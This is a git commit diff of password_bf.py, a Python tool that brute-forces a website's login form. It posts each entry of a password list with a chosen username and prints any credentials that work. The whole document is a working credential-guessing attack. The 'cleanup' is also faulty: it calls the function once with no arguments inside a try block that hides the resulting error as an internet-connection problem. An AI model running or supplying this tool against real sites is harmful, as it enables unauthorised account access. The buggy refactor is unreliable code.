53af08fe94c06151f90650fb9aa591cf7f2fd841
ClassErased <aaron@aacyber.uk>
2022-11-08 02:31:58 +0000

    cleaned up a bit, for my sanity.

--- password_bf.py
+++ password_bf.py
@@ -6,26 +6,31 @@ import requests
 targeturl = input("Enter Target Url: ")
 targetusername = input("Enter Target Username: ")
 error = input("Enter Wrong Password Error Message: ")
-try:
-    def bruteCracking(targetusername,targeturl,error):
-        for password in passwords:
-            password = password.strip()
-            print(f"Trying:", {password})
-            data_dict = {"username": targetusername,"password": password,"login":"submit"}
-            response = requests.post(targeturl, data=data_dict)
-            if error in str(response.content):
-               pass
-            elif "csrf" in str(response.content):
-                 print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
-                 exit(0)
-            else:
+
+def bruteCracking(targetusername,targeturl,error):
+    for password in passwords:
+        password = password.strip()
+        print(f"Trying:", {password})
+        data_dict = {"username": targetusername,"password": password,"login":"submit"}
+        response = requests.post(targeturl, data=data_dict)
+        if error in str(response.content):
+           pass
+        elif "csrf" in str(response.content):
+            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+            exit(0)
+        else:
                  print(f"Username: ---> ", {targetusername})
                  print(f"Password: ---> ", {password})
                  exit(0)
-except:
-    print("Some Error Occurred Please Check Your Internet Connection !!")
 
-with open("passwords.txt", "r") as passwords:
-    bruteCracking(targetusername,targeturl,error)
+#Fixed up the exception mess in the function, used __main__ to call the func and handle exception
+if __name__ == '__main__':
+    try:
+        bruteCracking()
+    except:
+        print("Some Error Occurred Please Check Your Internet Connection !!")
 
-print("[!!] password not in list")
+    with open("passwords.txt", "r") as passwords:
+        bruteCracking(targetusername,targeturl,error)
+
+    print("[!!] password not in list")
